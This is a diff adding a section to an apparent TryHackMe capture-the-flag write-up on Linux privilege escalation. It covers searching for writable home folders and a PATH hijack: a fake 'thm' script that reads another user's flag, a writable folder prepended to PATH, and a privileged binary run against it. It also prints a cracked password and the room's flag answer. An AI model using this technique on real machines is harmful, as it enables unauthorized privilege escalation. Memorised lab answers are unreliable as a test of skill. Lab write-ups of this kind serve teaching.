@@ -317,14 +317,43 @@ ok now we got the reverse shell with root privileges
 
 use the same trick to crack password of matt: `123456`
 
+## Privilege Escalation: PATH
 
+search find wrireable folders under home
 
+```
+find / -writable 2>/dev/null | grep home
+```
 
+![image](https://user-images.githubusercontent.com/90561566/196634144-ac36ab44-53be-4000-9bcb-d96987e0296a.png)
 
+we can see 3 folders in home
 
+![image](https://user-images.githubusercontent.com/90561566/196634310-1ae050bf-2336-42e7-bc22-f4b37dc26832.png)
 
+i found flag6 is under folder matt, but let see what on folder murdoch
 
+![image](https://user-images.githubusercontent.com/90561566/196635808-328abd0e-d934-4113-817c-76c2a8b3ff90.png)
 
+we see that it is dependent on thm, so that means we will need to create a thm file and write a little script to read the contents of flag6.txt
+
+```
+echo "cat /home/matt/flag6.txt" > thm
+chmod +x thm
+export PATH=/home/murdoch:$PATH
+```
+
+now enable the script
+
+```
+./test
+```
+
+![image](https://user-images.githubusercontent.com/90561566/196639273-a7ee57d0-de13-4314-8da5-d4f7d82832f3.png)
+
+| Flag | flag6.txt |
+| --- | --- |
+| Answer | THM-736628929 |
 
 
 
